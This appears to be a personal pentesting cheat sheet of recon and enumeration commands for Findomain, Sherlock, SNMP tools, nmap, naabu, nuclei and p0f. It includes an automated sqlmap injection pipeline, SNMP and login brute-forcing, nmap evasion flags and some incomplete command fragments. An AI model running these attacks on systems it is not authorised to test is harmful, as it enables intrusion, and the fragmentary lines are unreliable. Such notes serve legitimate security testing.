##   	[+] Findomain - Enumeration + Recon + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



findomain -u $File -t $target
findomain -u $subs_dir/findomain.txt -t $target



##-=============================================================================-##
##   [+] Findomain - Export the data to a custom output file name:
##-=============================================================================-##
findomain -t $Domain -u $File.txt


##-=============================================================================-##
##   [+] Findomain - Search of only resolvable subdomains:
##-=============================================================================-##
findomain -t $Domain -r


##-=============================================================================-##
##   [+] Findomain - Search only resolvable subdomains, 
##                   Exporting the data to a custom output file.
##-=============================================================================-##
findomain -t $Domain -r -u $File.txt


##-=============================================================================-##
##   [+] Findomain - Search subdomains from a file containing list of domains
##-=============================================================================-##
findomain -f file_with_domains.txt


##-=============================================================================-##
##   [+] Findomain - Search subdomains from a file containing list of domains
##                   Save all the resolved domains into a custom file name:
##-=============================================================================-##
findomain -f file_with_domains.txt -r -u multiple_domains.txt


##-=============================================================================-##
##   [+] Findomain - Query the Findomain database created using Subdomains Monitoring.
##-=============================================================================-##
findomain -t $Domain --query-database


##-=============================================================================-##
##   [+] Findomain - Query the Findomain database created with Subdomains Monitoring and 
##                   Save results to a custom filename.
##-=============================================================================-##
findomain -t $Domain --query-database -u $File.txt


##-========================================================================-##
##   [+] Findomain - Import subdomains from several files 
##                   Work with them in the Subdomains Monitoring process:
##-========================================================================-##
findomain --import-subdomains $File1.txt $File2.txt $File3.txt -m -t $Domain


##-========================================================================-##
##   [+] Findomain - Connect to remote computer/server remote PostgreSQL server 
##                   Using a username, password and database
##                   Push the data to Telegram webhook
##-========================================================================-##
## ------------------------------------------------------------------------------------------------ ##
##  [?] https://github.com/Findomain/Findomain/blob/master/docs/docs/create_telegram_webhook.md
## ------------------------------------------------------------------------------------------------ ##
findomain_telegrambot_token="Your_Bot_Token_Here" 
findomain_telegrambot_chat_id="Your_Chat_ID_Here" 

findomain -m -t $Domain --postgres-user postgres --postgres-password psql  --postgres-host 192.168.122.130 --postgres-port 5432


##-==================================-##
##   [+] Findomain- SQL Injection:
##-==================================-##
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1





sublist3r -v -d $target -o $File.txt
sed -i 's/<BR>/\n/g' $File.txt
sort $File | uniq > $File-sorted.txt


subfinder -d $target -o $subs_dir/subfinder.txt -config $config_dir/subfinder-config.yaml

amass enum  --passive -d $target -config $config_dir/amass-config.ini -o $subs_dir/amass.txt



hellfire

emailharvester

instaloader
inspy 
sherlock
irpas
sslh
swaks
hosthunter
finalrecon
dnschef
commix
cloudbrute
themole
websploit
weevely


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Sherlock - OSINT - Social Media Intel + Recon
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ----------------------------------------------------------------------- ##
##    sherlock --verbose $Username
## ----------------------------------------------------------------------- ##
##    sherlock --debug $Username       ## Display debug info and metrics
## ----------------------------------------------------------------------- ##

## ----------------------------------------------------------------------- ##
##    sherlock $Username --output $Dir/$File
## ----------------------------------------------------------------------- ##
##    sherlock $Username $Username --folderoutput $Dir/
## ----------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------ ##
##    sherlock --tor $Username            ## Make requests over Tor
## ------------------------------------------------------------------------------ ##
##    sherlock --unique-tor $Username     ## new Tor circuit after each request
## ------------------------------------------------------------------------------ ##

## ------------------------------------------------------------------------- ##
##    sherlock $Username --proxy $Proxy    ## Make requests using a proxy
## ------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------- ##
##    sherlock $Username --proxy socks5://10.64.0.1:1080
## ------------------------------------------------------------------------- ##
##    sherlock $Username --proxy socks5://10.8.0.1:1080
## ------------------------------------------------------------------------- ##

## ----------------------------------------------------------------------- ##
##    sherlock $Username --browse     ## Browse results using a browser
## ----------------------------------------------------------------------- ##

## --------------------------------------------------------------------------------- ##
##    sherlock $Username --csv        ## Create Comma-Separated Values (CSV) File
## --------------------------------------------------------------------------------- ##

## -------------------------------------------------------------------- ##
##    sherlock --json $File.json      ## Load data from a JSON File
## -------------------------------------------------------------------- ##



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SNMP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##  [+] Enmerate users from SNMP
snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP $TARGET

##  [+] Search SNMP with nmap
nmap -sT -p 161 192.168.1.0/24 -oG $File.txt


##  [+] Version3
nmap -sV -p 161 --script=snmp-info 192.168.1.0/24
nmap -sU  172.16.201.130 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=list.txt


##  [+] Wordlists
Metasploit Module snmp_enum
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt


##  [+] SNMP ENumeration:

snmpget -v 1 -c public IP version
snmpcheck -t $TARGET
snmpenum -t $TARGET
snmpwalk -v 1 -c public IP
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
snmpbulkwalk -v 2 -c public IP

snmpbrute.py -t <ip>

## gather snmp v1 information with standard community strings
snmpwalk -v1 -c public target-ip
snmpwalk -v1 -c private target-ip
snmpwalk -v1 -c manager target-ip

## enumerate windows users
snmpwalk -c public -v1 target-ip 1.3.6.1.4.1.77.1.2.25
    
## enumerate current windows processes
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.4.2.1.2
    
## enumerate windows open tcp ports
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.6.13.1.3
 
## enumerate installed software
snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.6.3.1.2


use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login

onesixtyone -c community -I $TARGET


onesixtyone -i $line -o ../dir${domain}/snmponesixtyone_output.txt
onesixtyone -c /usr/share/sparta/wordlists/snmp-default.txt -o snmp_one_sixtyone${2}.txt


onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd $1 2>&1 | tee "snmp_onesixtyone_$1.txt"


patator snmp_login host=$line version=3 user=FILE0 0=$USERNAME -x ignore:mesg=unknownUserName


patator snmp_login host=$line version=3 user=FILE0 auth_key=FILE1 0=$USERNAME 1=$auth_key -x ignore:mesg=wrongDigest



## --------------------------------------- ##
##  [?] Miranda - discover UPNP devices
## --------------------------------------- ##
miranda -i eth0 -v




## --------------------------------------------------------------------- ##
##   [+] Double checking for subdomains with amass and certspotter...
## --------------------------------------------------------------------- ##
amass enum -d $URL | tee -a $URL/recon/$File.txt
curl -s https://certspotter.com/api/v0/certs\?domain\=$URL | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
certspotter | tee -a $URL/recon/$File.txt




certspotter | tee -a $url/recon/final1.txt
sort -u $url/recon/final1.txt >> $url/recon/final.txt

subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> $url/recon/potential_takeovers/potential_takeovers1.txt






nmap -sU -sV -p 53 --script dns-recursion $domain






dnscan.py --domain $Domain --wordlist $File


dnscan -d $Target -w $Domains QUICK -o $Dir/domains-dnscan-$Target.txt






fierce --domain $Domain --subdomains accounts --traverse 10
fierce --domain facebook.com --subdomains accounts admin ads
fierce --domain facebook.com --subdomains admin --traverse 10


##-============================================================================-##
##   [+] Limit nearby IP traversal to certain domains with the --search flag:
##-============================================================================-##
fierce --domain $Domain --subdomains admin --search $Domain $Domain
fierce --domain facebook.com --subdomains admin --search fb.com fb.net

##-==================================================================================-##
##   [+] Attempt an HTTP connection on domains discovered with the --connect flag:
##-==================================================================================-##
fierce --domain $Domain --subdomains mail --connect



##-=========================-##
##  [+] Fierce
##-=========================-##
fierce -dns $Domain
fierce -dns $Domain -file $OutputFile
fierce -dns $Domain -dnsserver $Server
fierce -range $IPRange -dnsserver $Server
fierce -dns $Domain -wordlist $Wordlist
fierce -dnsserver $DNS -dns $Domain -wordlist /usr/share/fierce/hosts.txt


fierce -dns $Domain -threads 3



# To scan a domain and output to a file
fierce -dns $Domain -file $File

# To scan a domain and specify which dnsserver to use
fierce -dns $Domain -dnsserver <server>

# To scan an internal ip range for a given server
fierce -range <ip-range> -dnsserver <server>

# To scan a domain using a given wordlist
fierce -dns $Domain -wordlist <wordlist>

# To scan a domain using a specified timeout and number of ip addresses to branch from all found addresses
fierce -dns $Domain -tcptimeout <# seconds> -traverse <# addresses>

# To scan domains from a list and search the entire class C for each found
fierce -dnsfile $File -wide















dnsenum.pl --enum -f $File.txt --update a -r $Domain >> ~/Enumeration/$domain



##-=====================================================================-##
##   [+] Search for the A record of $Domain on your local nameserver:
##-=====================================================================-##
dnstracer $Domain


##-=====================================================================-##
##   [+] Search for the MX record of $Domain on the root-nameservers:
##-=====================================================================-##
dnstracer "-s" . "-q" mx $Domain


##-=================================================================-##
##   [+] Search for the PTR record (hostname) of 212.204.230.141:
##-=================================================================-##
dnstracer "-q" ptr 141.230.204.212.in-addr.arpa


##-========================-##
##   [+] IPv6 addresses:
##-========================-##
dnstracer "-q" ptr "-s" . "-o" 2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.6.4.0.2.0.0.0.0.8.b.0.e.f.f.3.ip6.int



Display overview of received answers after execution:

dnstracer -o $Domain


##-=================================================================-##
##   [+]
##-=================================================================-##
dnstop -l 3 eth0



##-================-##
##  [+] DNSMap
##-================-##
dnsmap -w $File.txt $Domain


## ----------------------------------------------------------- ##
##   [+] DNSenum - enumerate various DNS records, such as:
##                 NS, MX, SOA, and PTR records.
##   [?] DNSenum also tries to perform DNS zone transfer
## ----------------------------------------------------------- ##

dnsenum -p 5 -s 20 $Domain
dnsenum -f $File.txt $Domain
dnsenum -o dnsenum_info $Domain

dnsenum --enum -f $File.txt --update a -r $URL




fragroute -f $Location $IP

fragrouter -i eth0 $options


nping -c 1 --tcp -p 80,433 $Domain

nping -tcp -p 445 -data hexdata(AF56A43D) $IP

nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] NMap - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------------- ##
##   [?] Nmap - Port Scanning - Port Stage Levels
## ------------------------------------------------- ##
stage1-ports="80,443"
stage2-ports="25,135,137,139,445,1433,3306,5432,U:137,161,162,1434"
stage3-ports="23,21,22,110,111,2049,3389,8080,U:500,5060"
stage4-ports="0-20,24,26-79,81-109,112-134,136,138,140-442,444,446-1432,1434-2048,2050-3305,3307-3388,3390-5431,5433-8079,8081-29999"
stage5-ports="30000-65535"


nmap -sSV -p- --min-parallelism 64 --min-hostgroup 16 --max-hostgroup 64 --max-retries 3 -Pn -n -iL $File.txt -oA $Output --verson-all  --reason

The different flags in this command do the following:



## ------------------------------------------- ##
##   [?] NMap - SYN Scan + Version Checks
## ------------------------------------------- ##
nmap -sSV $IP



## --------------------------------------------- ##
##   [?] NMap - Scan all 65535 ports 1-65535
## --------------------------------------------- ##
nmap -p-:



## -------------------------------------------------------------------------- ##
    nmap --min-parallelism 64 $IP           ## Launch 64 parallel Scan probes
    nmap --min-hostgroup 16 $IP             ## Scan a minimum of 16 hosts
    nmap --max-hostgroup 64 $IP             ## Maximum amount of hosts
## -------------------------------------------------------------------------- ##
    nmap --max-retries 3 $IP                ## Max Probing Retries
## -------------------------------------------------------------------------- ##
    nmap -Pn $IP                            ## Skip ping scans (assume up)
    nmap -n $IP                             ## Skip dns resolution
## -------------------------------------------------------------------------- ##
    nmap -iL $File.txt $IP                  ## Input contains target hosts
## -------------------------------------------------------------------------- ##
    nmap -oA $File $IP              ## Output the results to: |gnmap|nmap|xml|
## -------------------------------------------------------------------------- ##
    nmap -oA $File.gnmap $IP        ## Output to: .gnmap
    nmap -oA $File.nmap $IP         ## Output to: .nmap
    nmap -oA $File.xml $IP          ## Output to: .xml
## -------------------------------------------------------------------------- ##




##-========================================-##
##   [+] NMap - OS Fingerprinting Scans:
##-========================================-##
## ---------------------------------------------------------------------------- ##
    nmap -O $IP                         ## Enable OS detection
    nmap -O --osscan-limit $Num $IP     ## Limit Scan to promising targets
    nmap -O --osscan-guess $IP          ## Guess OS more aggressively
## ---------------------------------------------------------------------------- ##



##-==================================================================================-##
##              [+] NMap - Service/Version Detection Scanning:
##-==================================================================================-##
## ---------------------------------------------------------------------------------- ##
    nmap -sV $IP                            ## Determine Service/Version info
## ---------------------------------------------------------------------------------- ##
    nmap -sV --version-intensity 0-9 $IP    ## Set from 0 (light) to 9 (try all probes)
    nmap -sV --version-light $IP            ## Limit to most likely probes (intensity 2)
    nmap -sV --version-all $IP              ## Try every single probe (intensity 9)
    nmap -sV --version-trace $IP            ## detailed version scan (for debugging)
## ---------------------------------------------------------------------------------- ##



    nmap 
## ---------------------------------------------------------------------------------- ##



## ---------------------------------------------------------------------------------- ##

    nmap --reason $IP         ## Port Status Details (open|filtered|closed)
## ---------------------------------------------------------------------------------- ##




## ---------------------------------------------------------------------------------- ##
    nmap --script-updatedb          ## Update the script database
## ---------------------------------------------------------------------------------- ##
    nmap --script-trace $IP         ## Show all data sent and received

## ---------------------------------------------------------------------------------- ##


## --------------------------------------------------------- ##
##   [?] NMap - Probe A Service - Look for known issues:
## --------------------------------------------------------- ##
nmap -sSV --version-all -p 11211 --min-parallelism 64 --script=vuln 10.0.0.1 -Pn -n

* Perform an aggressive scan
	* `nmap -A [target]`
* Scan an IPv6 target
	* `nmap -6 


## -------------------------------------------------------------------------- ##
##   [?] nmap --script=vuln | + Specified Port - only probe the port 11211 
## -------------------------------------------------------------------------- ##

## ---------------------------------------------------------------------- ##
##   [?] Then report any vulnerable services running on the specified port
## ---------------------------------------------------------------------- ##


## ---------------------------------------------------------------------- ##
##   [?] nmap -sC | Used to scan a target + Probe Using Common Scripts 
## ---------------------------------------------------------------------- ##


##-========================================-##
##   [+] Get The output of A Subnet Mask
##-========================================-##
nmap -sL -n 10.10.10.1/24 | grep report | cut -d " " -f 5 >>  ips.txt



## -------------------------------------------------------------- ##
##   [?] Print All Hosts Inside of The Given IP Address Range
##   [?] If you dont have a Subnet Calculator
##   [?] or if You Want To Assign Unique IPs In Other Tools
## -------------------------------------------------------------- ##



## -------------------------------------------- ##
##   [+] NMap - Nmap Scripting Engine (NSE)
## -------------------------------------------- ##


##-===============================-##
##   [+] NMap script categories  
##-===============================-##
nmap --scripts vuln,safe,discovery -oN scan.txt $IP


##-==============================-##
##   [+] list all nse scripts  
##-==============================-##
ls -lh /usr/share/nmap/scripts/


## -------------------------------------------------------------------------------------------- ##
    nmap --script-updatedb          ## Update the script database.
## -------------------------------------------------------------------------------------------- ##
    nmap --script-trace             ## Show all data sent and received
## -------------------------------------------------------------------------------------------- ##





##-==========================================-##
##   [+] NMap - Full Vulnerable Scanning:
##-==========================================-##

## -------------------------------------------------------------------------------------------- ##
    nmap -sS -sV --script=vulscan/vulscan.nse $IP
    nmap -sS -sV --script=vulscan/vulscan.nse $Domain
## -------------------------------------------------------------------------------------------- ##
    

## -------------------------------------------------------------------------------------------- ##
    nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv $IP
    nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv $Domain
## -------------------------------------------------------------------------------------------- ##
    nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 $IP
    nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 $Domain
## -------------------------------------------------------------------------------------------- ##
    nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 $IP
    nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 $Domain
## -------------------------------------------------------------------------------------------- ##
    nmap -sV --script=vuln $IP
    nmap -sV --script=vuln $Domain
## -------------------------------------------------------------------------------------------- ##
    nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 $IP
    nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 $Domain
## -------------------------------------------------------------------------------------------- ##





##-===================================-##
##   [+] NMap - Evasion Techniques:
##-===================================-##


nmap --mtu {number}] - Fragment Packets optionally with mtu
nmap -D {decoy1,decoy2} - Cloak with Decoys
nmap -S $IP             ## Spoof IP Address
nmap -g {port} - use given Port Number For Scan
nmap --proxies {url,url2} - use Proxy through HTTP/SOCKS4
nmap --data-length {number} - Append Random Data To Packets
nmap --ip-options {options} - Send Packets with IP Options
nmap --ttl {number} - Set IP TTL
nmap --spoof-mac {mac} - Spoof MAC For Scan
nmap --bad-sum - Send Packets with Bogus Checksums




##-======================================================-##
##   [+] NMap - Tunnel Connection Through Socks5 Proxy  
##-======================================================-##
nmap --proxies socks4://10.8.0.1:1080 $IP
nmap --proxies socks4://10.64.0.1:1080 $IP



##-===============================-##
##   [+] NMap - FTP Bounce Scan
##-===============================-##
nmap -P0 -n -b $User:$Pass@$IP $IP2 --proxies socks4://10.8.0.1:1080 -vvvv
nmap -P0 -n -b $User:$Pass@$IP $IP2 --proxies socks4://10.64.0.1:1080 -vvvv



whois-domain.nse
whois-ip.nse

url-snarf.nse

tor-consensus-checker.nse
traceroute-geolocation.nse
targets-asn.nse
targets-sniffer.nse
targets-traceroute.nse






## -------------------------------------------------------------------------------------------- ##
     nmap -R $Target                             ## Force Reverse DNS Resolution
## -------------------------------------------------------------------------------------------- ##
     nmap -n $Target                             ## Disable Reverse DNS Resolution
## -------------------------------------------------------------------------------------------- ##
     nmap --system-dns $Target                   ## Alternative DNS -ookup
## -------------------------------------------------------------------------------------------- ##
     nmap --dns-servers $DNSServers $Target      ## Manually Specify DNS Servers
## -------------------------------------------------------------------------------------------- ##


## -------------------------------------------------------------------------------------------- ##
##   [?] Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists
## -------------------------------------------------------------------------------------------- ##
nmap --script dns-blacklist --script-args='dns-blacklist.ip=$IP'


##-==================================-##
##   [+] NMap - dns-zone-transfer:
##-==================================-##
## ---------------------------------------------------------------- ##
##   [?] Attempts to pull a zone file (AXFR) from a DNS server.
## ---------------------------------------------------------------- ##
nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=$Domain -p53 $IP


nmap $ip --script dns-zone-transfer,dns-srv-enum -oN $OutFile $IP


##-==================================-##
##   [+] NMap - 
nmap --script dns-brute $Domain
nmap --script dns-brute --script-args dns-brute.domain=$Domain,dns-brute.threads=$Num,dns-brute.hostlist=$File,newtargets -sS -p 80




##-====================================================-##
##   [+] NMap - DNS Cache Snooping Emumeration Scan:
##-====================================================-##


nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains=$Domain' $IP




nmap -sn -Pn ns1.example.com --script dns-check-zone --script-args='dns-check-zone.domain=$Domain'



nmap -n -Pn -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me $Domain



nmap -n -sV -Pn -vv -sT -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=

nmap -n -sV -Pn -vv -sU -p $Port --script dns-cache-snoop,dns-check-zone,dns-ip6-arpa-scan,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zone-transfer,whois-domain --script-args dns-check-zone.domain=%s,dns-nsec-enum.domains=%s,dns-nsec3-enum-domains=%s,dns-srv-enum.domain=%s,dns-zone-transfer.domain=


##-===========================-##
##   [+] NMap - DNS Fuzzer  
##-===========================-##
nmap --script dns-fuzz --script-args timelimit=2h $IP -d



curl https://api.hackertarget.com/aslookup/?q=$1 > $OutFile.txt


##-===================================================================================-##
##   [+] NMap - Finding netblocks that belong to an ASN using targets-asn NSE script
##-===================================================================================-##
nmap --script targets-asn --script-args targets-asn.asn=$ASN


##-=================================================-##
##   [+] NMap - Find Information about IP address
##-=================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24




for ip in $(cat targets.txt);do nmap -A -T4 -oN scans/nmap.$ip.txt $IP;done


##-======================================================-##
##   [+] NMap - Most Detailed Scans - Full NMap Scans
##-======================================================-##
nmap -sV $ip -p- -A -T5 -oN nmap_full_$ip --stats-every 10s







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Naabu - Port Scanning + Attack Surface Discovery
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



naabu -scan-all-ips $Domain

naabu -proxy $Proxy
naabu -passive
naabu -host-discovery
naabu -debug
naabu -verbose
naabu -top-ports-100
naabu -top-ports-1000
naabu -p -
naabu -list $File

echo $ASN | naabu -p 80,443
echo $Domain | naabu -silent | httpx -silent
echo $Domain | dnsx -resp-only -a -aaaa -silent | naabu -p 80 -silent
echo $Domain | naabu -p 80 -ip-version 6
echo $Domain | naabu -ip-version 4,6 -scan-all-ips -p 80 -silent


## -------------------------------------------------------------------- ##
      naabu -arp $IP            ## ARP Ping
## -------------------------------------------------------------------- ##
      naabu -pe $IP            ## ICMP Echo Ping
## -------------------------------------------------------------------- ##
      naabu -pp $IP            ## ICMP Timestamp Ping
## -------------------------------------------------------------------- ##
      naabu -pm $IP            ## ICMP Address Mask Ping
## -------------------------------------------------------------------- ##
      naabu -nd $IP            ## IPv6 Neighbor Discovery
## -------------------------------------------------------------------- ##
      naabu -rev-ptr $Domain   ## Reverse PTR Lookup For input IPs
## -------------------------------------------------------------------- ##


naabu -host $IP
naabu -json
-csv


$HOME/.config/naabu/config.yaml



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] Nuclei - Port Scanning + Attack Surface Discovery
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===================================-##
##   [+] Nuclei - Basic Detections
##-===================================-##
nuclei -l "$SUBS"/hosts -t generic-detections/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/generic-detections.txt


##-=================================-##
##   [+] Nuclei - CVEs Detection
##-=================================-##
nuclei -l "$SUBS"/hosts -t cves/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/cve.txt


##-=====================================-##
##   [+] Nuclei - Default-Creds Check
##-=====================================-##
nuclei -l "$SUBS"/hosts -t default-credentials/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/default-creds.txt


##-===========================-##
##   [+] Nuclei - DNS Check
##-===========================-##
nuclei -l "$SUBS"/hosts -t dns/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/dns.txt


##-=============================-##
##   [+] Nuclei - Files Check
##-=============================-##
nuclei -l "$SUBS"/hosts -t files/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/files.txt


##-==============================-##
##   [+] Nuclei - Panels Check
##-==============================-##
nuclei -l "$SUBS"/hosts -t panels/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/panels.txt


##-==================================================-##
##   [+] Nuclei - Security Mis-Configuration Check
##-==================================================-##
nuclei -l "$SUBS"/hosts -t security-misconfiguration/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/security-misconfiguration.txt


##-=====================================-##
##   [+] Nuclei - Technologies Check
##-=====================================-##
nuclei -l "$SUBS"/hosts -t technologies/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/technologies.txt


##-===============================-##
##   [+] Nuclei - Tokens Check
##-===============================-##
\nuclei -l "$SUBS"/hosts -t tokens/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/tokens.txt


##-======================================-##
##   [+] Nuclei - Vulnerabilties Check
##-======================================-##
nuclei -l "$SUBS"/hosts -t vulnerabilities/ -c 50 -H "x-bug-bounty: $hackerhandle" -o "$NUCLEISCAN"/vulnerabilties.txt

nuclei -u https://example.com -tags cve
nuclei -u https://example.com -tags config -t ~/nuclei-templates/cves/exposures/

##-==========================================-##
##   [+] Nuclei - Subdomain-Takeover Check
##-==========================================-##
cat "$SUBS"/hosts | nuclei -t subdomain-takeover/ -c 50 -o "$SUBS"/nuclei-takeover-checks.txt


##-=====================================-##
##   [+] nuclei - Analyzing JS files
##-=====================================-##
nuclei -l JS.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt


##-================================-##
##    [+] Nuclei - Scan all ports
##-================================-##
httpx -l ips.txt -ports - -o IPsPorts.txt

nuclei -l IPsPorts.txt -t nuclei-templates




nuclei -w ~/nuclei-templates/workflows/wordpress-workflow.yaml -severity critical,high -list http_urls.txt







##-================================================-##
##   [+] Curl - Find ASN for a given IP address:
##-================================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as


##-============================================================================-##
##   [+] ss - Lookup Autonomous Systems (AS) of all outgoing http/s traffic
##-============================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3



##-===================================-##
##   [+] IPCalc - Calculate subnet
##-===================================-##
ipcalc xxx.xxx.xxx.xxx/24



##-=========================================-##
##   [+] NMap - live hosts - Netmask Scan
##-=========================================-##
nmap -vv -n -sn -PM -oA $File $1 | grep -w 'report' | grep -v 'host down' | sed 's/Nmap scan report for //' | sort -u -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | tee $LOGNAME2




## ---------------------------------------------------------------------- ##
	fping -a -q -g $2				## Generate Alive Hosts From File
## ---------------------------------------------------------------------- ##
	fping -g $IP $IP				## Generate Host List:
## ---------------------------------------------------------------------- ##
	fping -s $Domain				## Display Statistics:
## ---------------------------------------------------------------------- ##
	fping < $File					## ping addresses read from a file
## ---------------------------------------------------------------------- ##
	fping -ag 192.0.2.0/24			## Find hosts In a given subnet
## ---------------------------------------------------------------------- ##
	fping $IP -s -c 10000 -p 100	## send high rate of
									## echo-request packets
## ---------------------------------------------------------------------- ##



## --------------------------------------------------------- ##
##   [?] Use fping to test reachability to range of hosts
##       using bash for loop to define hosts
## --------------------------------------------------------- ##
for i in {1..5} ; do fping -C 3 -d -q -s -g 10.0.2$i.100 10.0.2$i.150 ; done



fping -A -f /tmp/ip 2>&-


##-====================================================-##
##   [+] Print List of Live Hosts on Local Network:
##-====================================================-##
genlist -s 192.168.1.\*




Brutespray

python brutespray.py --file $File.gnmap -u admin -p pass --threads 5 --hosts 5


python brutespray.py --file $File.xml -u admin -p pass --threads 5 --hosts 5


python brutespray.py --file $File.json -u admin -p pass --threads 5 --hosts 5







## ------------------------------------------------- ##
##   [?] p0f - passive os fingerprinting utility
## ------------------------------------------------- ##
p0f -i eth0
p0f -i wlan0


##-=========================================================-##
##   [+] Set iface to promiscuous mode, dump to log file:
##-=========================================================-##
p0f -i eth0 -p -d -o $File.log
p0f -i wlan0 -p -d -o $File.log


##-============================================-##
##   [+] p0f - Read from offline PCAP $File:
##-============================================-##
p0f -r $File 


##-======================================================-##
##   [+] p0f - Filter Traffic - Source Port - FTP-Data
##-======================================================-##
p0f -r $File 'src port ftp-data'
p0f -i wlan0 'src port ftp-data'


##-====================================================================================-##
##   [+] p0f - Filter Traffic - NOT Destination Network 10.0.0.0 & Netmask 255.0.0.0
##-====================================================================================-##
p0f -r $File 'not dst net 10.0.0.0 mask 255.0.0.0'
p0f -i wlan0 'not dst net 10.0.0.0 mask 255.0.0.0'


##-=============================================================-##
##   [+] p0f - Filter Traffic - Destination Port 80 & $SrcIP
##-=============================================================-##
p0f -r $File 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'
p0f -i wlan0 'dst port 80 and ( src host $SrcIP or src host $SrcIP )'







p0f version check

p0f -i vercheck > /tmp/.pofcheck 2>&1
cat /tmp/.pofcheck | head -n1 | awk '{for(i=1;i<NF;i++) {if ($i ~ /p0f|version/) {ver=$(++i); gsub (/[[:alpha:]]|\./,"",ver);print "VER="ver; } } }'`


